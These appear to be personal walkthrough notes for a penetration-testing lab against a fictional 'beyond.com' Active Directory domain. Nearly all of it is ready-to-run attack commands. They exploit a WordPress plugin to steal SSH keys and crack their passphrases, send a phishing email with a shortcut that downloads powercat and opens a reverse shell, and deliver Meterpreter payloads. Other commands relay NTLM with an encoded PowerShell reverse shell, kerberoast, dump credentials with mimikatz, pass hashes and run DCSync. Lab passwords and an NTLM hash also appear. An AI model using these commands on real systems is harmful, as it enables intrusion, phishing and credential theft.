we have 2 servers, MAILSRV and WEBSRV
first do portscan/ combined with tools like googledork to get potentially sensitive info
```
sudo nmap -sC -sV -oN mailsrv1/nmap 192.168.205.242
sudo nmap -sC -sV -oN websrv1/nmap 192.168.205.244
```

probe further for versions of running software and google for CVEs
continue enumeration by going to webpage. then search for more directories
```
gobuster dir -u http://192.168.205.242 -w /usr/share/wordlists/dirb/common.txt -o mailsrv1/gobuster -x txt,pdf,config
```

inspect the webpage to look for artifacts (CMS)
use whatweb to get more info on tech used
`whatweb 192.168.205.244`

find that WP is used, check plugins/themes for vulnerabilities
```
wpscan --url http://192.168.205.244 --enumerate p --plugins-detection aggressive -o websrv1/wpscan
cat websrv1/wpscan
```

find outdated plugins and use searchsploit t4 find exploits
```
searchsploit duplicator
searchsploit -x 50420
searchsploit -m 50420
python3 50420.py http://192.168.205.244 /etc/passwd
```

in directory traversal, we want ssh private keys with open perms, using users from /etc/passwd
```
python3 50420.py http://192.168.205.244 /home/marcus/.ssh/id_rsa
python3 50420.py http://192.168.205.244 /home/daniela/.ssh/id_rsa
chmod 600 id_rsa
ssh -i id_rsa daniela@192.168.116.244
```

crack ssh key passphrase with ssh2john and rockyou - returns tequieromucho
```
ssh2john id_rsa > ssh.hash
john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
```

perform local enumeration to identify attack vectors and sensitive information and attempt to elevate our privileges - use linpeas
```
cp /usr/share/peass/linpeas/linpeas.sh .
python3 -m http.server 80
```

copy to target
```
wget http://192.168.45.242/linpeas.sh
chmod a+x ./linpeas.sh
```

attack vector from output
- User daniela may run the following commands on websrv1:
   ` (ALL) NOPASSWD: /usr/bin/git`
- use gtfobins - https://gtfobins.github.io/gtfobins/git/#sudo
- running one of their commands, we gain root access

search git repo for sensitive info
```
cd /srv/www/wordpress/
git status
git log
git show 612ff5783cc5dbd1e0e008523dba83374a84aaf1
```

found credentials
```
sshpass -p "dqsTwTpZPn#nL" rsync john@192.168.50.245:/current_webapp/ /srv/www/wordpress/
```

make wordlists of found usernames and passwords
use crackmapexec to password spray
```
crackmapexec smb 192.168.230.242 -u usernames.txt -p passwords.txt --continue-on-success
```
STATUS_LOGON_FAILURE either means password is incorrect or user does not exist

try to find shares - note that in this case it just returned default shares with no actionable perms
```
crackmapexec smb 192.168.230.242 -u john -p "dqsTwTpZPn#nL" --shares
```

### phishing attack is the next step
we have to set up a WebDAV server, a Python3 web server, a Netcat listener, and prepare the Windows Library and shortcut file

webdav
```
mkdir /home/kali/beyond/webdav
/home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/beyond/webdav/
```

now use a prep windows box to prepare the malicious shortcut
```
xfreerdp /cert-ignore /u:offsec /p:lab /v:192.168.230.250
```

Download from windows (with authentication)
```
impacket-smbserver -smb2support -user offsec -password lab smb smb 
```

from windows - cmd
```
net use \\192.168.45.219\smb
copy config.Library-ms \\192.168.45.219\smb
copy install.lnk \\192.168.45.219\smb
```

start python webserver and nc listener
```
cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
python3 -m http.server 8000
nc -nvlp 4444
```

create new shortcut on desktop with the following
```
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.242:8000/powercat.ps1'); powercat -c 192.168.45.242 -p 4444 -e powershell"
```

send phishing email - john:dqsTwTpZPn#nL
```
sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.230.242 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
```

now that we have access to the internal network, we can enumerate it - download winpeas to the target
```
cd C:\Users\marcus
iwr -uri http://192.168.45.242:8000/winPEASx64.exe -Outfile winPEAS.exe
.\winPEAS.exe
```

double check OS
```
systeminfo

cat computer.txt
172.16.116.240 - DCSRV1.BEYOND.COM
-> Domain Controller

172.16.116.241 - INTERNALSRV1.BEYOND.COM

172.16.116.254 - MAILSRV1.BEYOND.COM
-> Mail Server
-> Dual Homed Host (External IP: 192.168.230.242)

172.16.116.243 - CLIENTWK1.BEYOND.COM
-> User _marcus_ fetches emails on this machine
```

copy over sharphound
```
cp /usr/lib/bloodhound/resources/app/Collectors/SharpHound.ps1 .
iwr -uri http://192.168.45.242:8000/SharpHound.ps1 -Outfile SharpHound.ps1
powershell -ep bypass
.\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All
```

transfer output files to kali
```
net use \\192.168.45.242\smb
copy 20231114113128_BloodHound.zip \\192.168.45.242\smb
```

use bloodhound from kali
```
sudo neo4j start
bloodhound
```

From bloodhound query search
```
MATCH (m:Computer) RETURN m
MATCH (m:User) RETURN m
```

look at active sessions
```
MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p
```

- we can mark known users john and marcus as owned to make use of pre-built queries
- then run Find all Domain Admins
- we find that beccy is a member of the domain admins group
- In a real penetration test, we should also examine domain groups and GPOs

use these pre-built queries
- Find Workstations where Domain Users can RDP
- Find Servers where Domain Users can RDP
- Find Computers where Domain Users are Local Admin
- Shortest Path to Domain Admins from Owned Principals
- list of kerberoastable accounts

`nslookup INTERNALSRV1.BEYOND.COM`

create staged payload
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.242 LPORT=444 -f exe -o met.exe
```

```
sudo msfconsole -q
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.45.242
set LPORT 443
set ExitOnSession false
run -j
```

from clientwk as marcus
```
iwr -uri http://192.168.45.242:8000/met.exe -Outfile met.exe
.\met.exe
```

access internal network and enumerate
```
use multi/manage/autoroute
set session 1
run
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set VERSION 5
run -j
```

confirm proxychains
```
cat /etc/proxychains4.conf
# socks5 127.0.0.1 1080
```

enumerate the internal network
```
proxychains -q crackmapexec smb 172.16.89.240 172.16.89.241 172.16.89.254 -u john -d beyond.com -p "dqsTwTpZPn#nL" --shares

sudo proxychains -q nmap -sT -oN nmap_servers -Pn -p 21,80,443 172.16.89.240 172.16.89.241 172.16.89.254
```

download windows and linux chisel - https://github.com/jpillora/chisel/releases/tag/v1.7.7
```
wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
gunzip chisel_1.7.7_linux_amd64.gz 
mv chisel_1.7.7_linux_amd64 chisel
mv chisel_1.7.7_windows_amd64 chisel.exe
chmod a+x chisel
./chisel server -p 8080 --reverse
```

upload chisel to the windows machine using meterpreter session upload
```
sessions -i 1
upload chisel.exe C:\\Users\\marcus\\chisel.exe
```

now on clientwk as marcus we can use chisel to connect back to kali - port 80 needs to be open on kali
```
.\chisel.exe client 192.168.45.242:8080 R:80:172.16.89.241:80
```

once chisel connects we can go to 127.0.0.1 on kali firefox to view webpage
- need to add to /etc/hosts
```
127.0.0.1    internalsrv1.beyond.com
```
- go to http://127.0.0.1/wordpress/wp-admin 


perform kerberoasting - requires the creds of a domain user to get the TGS-REP hash
```
proxychains -q impacket-GetUserSPNs -request -dc-ip 172.16.89.240 beyond.com/john
```

store the hash in a file and use hashcat to crack it - obtained password DANIelaRO123
```
sudo hashcat -m 13100 daniela.hash /usr/share/wordlists/rockyou.txt --force
```

```
sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.203.242 -c "powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIANAAyACIALAA5ADkAOQA5ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
```

# change backup dir to //192.168.45.242/test

cd C:\Users\Administrator
iwr -uri http://192.168.45.242:8000/met.exe -Outfile met.exe
.\met.exe


# in msfconsole interact with the session
sessions -i 2
shell
powershell

# download mimikatz - https://github.com/gentilkiwi/mimikatz/releases
iwr -uri http://192.168.45.242:8000/mimikatz.exe -Outfile mimikatz.exe
.\mimikatz.exe
privilege::debug
sekurlsa::logonpasswords

# get beccy NTLM
f0397ec5af49971f6efbdb07877046b3
# beccy kerberos pw
NiftyTopekaDevolve6655!#!

proxychains impacket-psexec -hashes :f0397ec5af49971f6efbdb07877046b3 beccy@172.16.97.240



#### last part ####
###################
# setup
/home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/beyond/webdav/
nc -nvlp 4444
python3 -m http.server 8000

# send phishing email - john:dqsTwTpZPn#nL
sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.211.242 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap

sudo msfconsole -q
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.45.242
set LPORT 443
set ExitOnSession false
run -j

# from marcus
iwr -uri http://192.168.45.242:8000/met.exe -Outfile met.exe
.\met.exe

# access internal network and enumerate
use multi/manage/autoroute
set session 1
run
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set VERSION 5
run -j

sudo proxychains -q nmap -sT -oN nmap_servers -Pn -p 21,80,443,445 172.16.97.240
proxychains impacket-psexec -hashes :f0397ec5af49971f6efbdb07877046b3 beccy@172.16.97.240

whoami
hostname
ipconfig

iwr -uri http://192.168.45.242:8000/mimikatz.exe -Outfile mimikatz.exe
.\mimikatz.exe
lsadump::dcsync /user:beyond\Administrator

